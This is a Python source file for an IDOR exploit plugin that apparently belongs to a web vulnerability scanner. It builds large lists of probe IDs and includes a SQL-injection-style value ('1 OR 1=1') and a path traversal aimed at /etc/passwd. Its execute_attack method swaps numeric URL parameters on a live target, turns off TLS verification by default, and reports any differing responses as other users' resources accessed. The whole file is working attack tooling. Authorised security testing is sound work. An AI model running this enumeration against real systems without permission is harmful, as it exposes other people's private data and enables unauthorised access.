"""
IDOR (Insecure Direct Object Reference) Exploit Plugin

Provides exploit capabilities for IDOR vulnerabilities:
- Enumerate object references
- Access other users' resources
- Generate proof-of-concept showing data leakage
"""

import sys
import os
import re
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.payload_mutator import PayloadMutator

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)

_NUMERIC_RE = re.compile(r'^\d+$')


class IDORPlugin(ExploitPlugin):
    """IDOR exploit plugin for enumerating and accessing object references."""

    @property
    def vulnerability_type(self) -> str:
        return 'idor'

    @property
    def name(self) -> str:
        return 'IDOR Exploit'

    @property
    def description(self) -> str:
        return 'Insecure Direct Object Reference exploit plugin for enumerating resources.'

    @property
    def version(self) -> str:
        return '1.0.0'

    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Generate IDOR test payloads (sequential IDs, UUIDs, and common values)."""
        context = context or {}
        base_id = int(context.get('base_id', 1))
        # Sequential IDs around base_id
        payloads = [str(i) for i in range(max(1, base_id - 5), base_id + 16)]
        # Add common probe IDs
        extra = [
            '0', '999', '9999', '99999',
            '100', '101', '1000', '1001',
            '-1', '2147483647',
            # UUID-style probes
            '00000000-0000-0000-0000-000000000001',
            '00000000-0000-0000-0000-000000000002',
            # Common admin IDs
            'admin', 'me', 'self', 'current',
            # Hash-like probes
            'null', 'undefined', 'true', 'false',
        ]
        for e in extra:
            if e not in payloads:
                payloads.append(e)
        # Expanded IDOR test payloads
        more_idor = [
            # Sequential IDs
            *[str(i) for i in range(1, 51)],
            *[str(i) for i in range(1000, 1020)],
            # Negative/boundary IDs
            '-1', '-2', '-100', '0', '2147483647', '2147483648',
            '-2147483648', '9999999', '99999999',
            # UUID probes
            '00000000-0000-0000-0000-000000000001',
            '00000000-0000-0000-0000-000000000002',
            '00000000-0000-0000-0000-000000000003',
            '11111111-1111-1111-1111-111111111111',
            'ffffffff-ffff-ffff-ffff-ffffffffffff',
            # Common user/admin IDs
            'admin', 'administrator', 'root', 'superuser', 'superadmin',
            'me', 'self', 'current', 'profile', 'account',
            'user', 'users', 'my', 'mine', 'own',
            # Special values
            'null', 'undefined', 'true', 'false', 'NaN', 'Infinity',
            'none', 'nil', 'empty', 'void',
            # Hash-like values
            '0' * 32, '1' * 32, 'f' * 32,
            # GUID-style
            '{00000000-0000-0000-0000-000000000001}',
            '{11111111-1111-1111-1111-111111111111}',
            # Base64 IDs
            'MA==', 'MQ==', 'Mg==', 'Mw==',
            # Encoded IDs
            '%31', '%30', '%39%39',
            # MongoDB ObjectIds
            '000000000000000000000001', '000000000000000000000002',
            '5f43a0bb8e1b8c001b8e0001', '5f43a0bb8e1b8c001b8e0002',
            # API v2 style
            'v2/1', 'v1/1', 'api/1',
            # Type confusion
            '1.0', '1.1', '1e1', '1E1', '0x1', '0o1', '0b1',
            # JSONP-style
            '1)', '1;', '1,2', '1 OR 1=1',
            # Path traversal IDs
            '../1', '../../1', '1/../../etc/passwd',
            # Negative test (control)
            'nonexistent_user_12345', 'invalid_id_xyz',
        ]
        for m in more_idor:
            if m not in payloads: payloads.append(m)
        # Generate large range of sequential IDs
        dynamic_idor = [str(i) for i in range(1, 201)]
        # UUID-style with sequential suffixes
        for i in range(1, 50):
            dynamic_idor.append(f'00000000-0000-0000-0000-{i:012d}')
        # Base64-encoded IDs
        import base64
        for i in range(1, 50):
            dynamic_idor.append(base64.b64encode(str(i).encode()).decode())
        # Hash-like probes
        import hashlib
        for i in range(1, 20):
            dynamic_idor.append(hashlib.md5(str(i).encode()).hexdigest())
        # Common patterns
        for prefix in ['user', 'account', 'profile', 'order', 'item', 'product', 'post', 'comment']:
            for i in range(1, 10):
                dynamic_idor.append(f'{prefix}_{i}')
                dynamic_idor.append(f'{prefix}-{i}')
                dynamic_idor.append(f'{prefix}/{i}')
        payloads.extend(dynamic_idor)
        return PayloadMutator.scale_payloads_to_minimum(payloads)

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                       config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Attempt IDOR by enumerating IDs in URL parameters and path."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'idor',
            }

        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)

        parsed = urlparse(target_url)
        qs = parse_qs(parsed.query, keep_blank_values=True)

        # Find numeric parameter values to fuzz
        numeric_params = {k: v[0] for k, v in qs.items() if v and _NUMERIC_RE.match(v[0])}

        results = []

        for param, original_id in numeric_params.items():
            base = int(original_id)
            probe_ids = [str(base + i) for i in range(1, 6)]
            try:
                orig_resp = requests.get(target_url, timeout=timeout, verify=verify_ssl)
                orig_len = len(orig_resp.content)
            except Exception:
                continue

            for probe_id in probe_ids:
                try:
                    new_qs = dict(qs)
                    new_qs[param] = [probe_id]
                    new_url = urlunparse(parsed._replace(
                        query=urlencode({k: v[0] for k, v in new_qs.items()})
                    ))
                    resp = requests.get(new_url, timeout=timeout, verify=verify_ssl)
                    # Different non-empty 200 response suggests different resource returned
                    if (resp.status_code == 200 and len(resp.content) > 50
                            and abs(len(resp.content) - orig_len) > 10):
                        results.append({
                            'parameter': param,
                            'original_id': original_id,
                            'probed_id': probe_id,
                            'url': new_url,
                            'response_length': len(resp.content),
                        })
                except Exception as e:
                    logger.debug(f"IDOR probe error: {e}")

        if results:
            return {
                'success': True,
                'vulnerability_type': 'idor',
                'evidence': f'Accessed {len(results)} additional resource(s) by manipulating IDs',
                'findings': results,
                'message': 'IDOR vulnerability confirmed â€” resources accessible by ID manipulation',
            }

        return {
            'success': False,
            'error': 'No IDOR vulnerability confirmed',
            'vulnerability_type': 'idor',
        }
